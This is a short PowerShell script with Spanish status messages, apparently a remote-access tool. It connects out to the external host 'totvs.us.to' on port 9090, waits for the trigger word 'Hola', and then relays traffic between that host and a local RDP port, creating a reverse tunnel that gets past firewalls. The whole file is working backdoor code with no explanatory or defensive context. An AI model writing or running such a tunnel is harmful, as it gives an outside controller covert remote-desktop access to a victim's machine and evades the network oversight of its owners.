$ClientControl = New-Object System.Net.Sockets.TcpClient
$ClientControl.Connect("totvs.us.to",9090)
Write-Host "[+] Servidor Conectado"
$ServerStream = $ClientControl.GetStream()
$Buffers = New-Object byte[] 65536
$MSGDatos = New-Object byte[] 65536
$MSGData = New-Object byte[] 65536

while($true)
{
    $MSGRead = $ServerStream.Read($Buffers,0,$Buffers.Length)
    if($MSGRead -gt 0)
    {
        $MSGCommands =[System.Text.Encoding]::UTF8.GetString($Buffers,0,$MSGRead).Trim()

        if($MSGCommands.Trim() -eq "Hola")
        {
       Write-Host "[+] Abriendo RDP Local"

$RdpControl = New-Object System.Net.Sockets.TcpClient
$RdpControl.Connect("127.0.0.4",7070)
$RdpStream = $RdpControl.GetStream()

while($true)
            {
                if($ServerStream.DataAvailable)
                {
                    $Rolst = $ServerStream.Read($MSGDatos,0,$MSGDatos.Length)
                    $RdpStream.Write($MSGDatos,0,$Rolst)
                }
                if($RdpStream.DataAvailable)
                {
                    $Mastr = $RdpStream.Read($MSGData,0,$MSGData.Length)
                    $ServerStream.Write($MSGData,0,$Mastr)
                }
            }
        }
    }
}
